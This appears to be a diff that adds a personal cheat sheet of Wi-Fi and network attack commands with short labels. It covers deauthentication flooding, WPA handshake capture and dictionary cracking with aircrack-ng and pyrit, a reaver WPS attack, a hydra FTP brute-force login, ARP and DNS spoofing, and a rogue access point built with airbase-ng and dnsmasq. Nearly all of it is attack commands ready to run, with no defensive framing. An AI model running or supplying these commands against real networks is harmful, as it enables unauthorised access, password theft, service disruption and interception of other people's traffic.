@@ -1,0 +1,97 @@
+Check Network Devices
+ifconfig
+
+Check Wireless devices
+iwconfig
+
+Check hindering Processes
+airmon-ng check
+
+Kill hindering Processes
+airmon-ng check kill
+
+Start Monitor Mode
+airmon-ng start wlo1
+
+Search
+airodump-ng wlan1mon
+
+Search specifi wifi
+airodump-ng --bssid ##:##:##:##:##:## --channel 1 wlan1mon
+
+Deauth
+aireplay-ng --deauth 2000 -a ##:##:##:##:##:## -c ##:##:##:##:##:## wlan1mon
+
+# untested
+
+Handshake
+airodump-ng --bssid ##:##:##:##:##:## --channel 1 --ignore-negative-one -w /home/gagan/Desktop/Captures/WPASample mon2
+
+Crack Password Aircrack
+aircrack-ng /home/gagan/Desktop/Captures/WPASample-01.cap -w /home/gagan/Desktop/List/list
+
+Decript Captures
+airdecap-ng -e '#######' -p ####### /home/gagandeep/Desktop/Captures/WPASample-01.cap
+
+Pyrit Core Check
+pyrit list_cores
+
+Pyrit Handshake Analyze
+pyrit -r /home/gagandeep/Desktop/Captures/WPASample-01.cap analyze
+
+Pyrit Evaluation
+pyrit eval
+
+Pyrit Add Password
+pyrit -i /home/gagan/Desktop/Lists/list import_passwords
+
+Pyrit Add Essid
+pyrit -e BELL182 create_essid
+
+Pyrit Batch Processing 
+pyrit batch
+
+Pyrit Attack
+pyrit -r /home/gagandeep/Desktop/Captures/WPASample-01.cap attack_db
+
+Pyrit Delete Essid
+pyrit -e ####### delete_essid
+
+Pyrit Delete Password Database
+rm -rf .pyrit/blobspace/password
+
+Reaver Attack
+reaver -i wlan0mon -b ##:##:##:##:##:## -c 11 -f -w -vvv
+
+
+Hydra Login Attack
+hydra ftp://[192.168.2.1]/login.html -e ns -F -V -t 4 -L /home/gagandeep/Desktop/list1 -P /home/gagandeep/Desktop/list2
+
+
+On Ip Fowarding
+echo 1 >/proc/sys/net/ipv4/ip_forward
+
+apache start
+/etc/init.d/apache2 start
+
+command to know ip address
+ip addr show
+
+arpspoof response 
+arpspoof -t 192.168.2.28 192.168.2.1 && arpspoof -t 192.168.2.1 192.168.2.28
+
+dnsspoof
+dnsspoof -f /home/gagandeep/Desktop/spoofhosts host 192.168.2.28 and udp port 53
+
+Fake Point create
+airbase-ng -e 'TEST' -c 6 wlan0mon
+
+Dnsmasq 
+dnsmasq  -C /etc/dnsmasq.conf -H home/gagandeep/Desktop/fakehosts.conf -d
+
+Know process on 53
+sudo lsof -i :53
+
+Kill process n port
+kill -KILL 2306
+
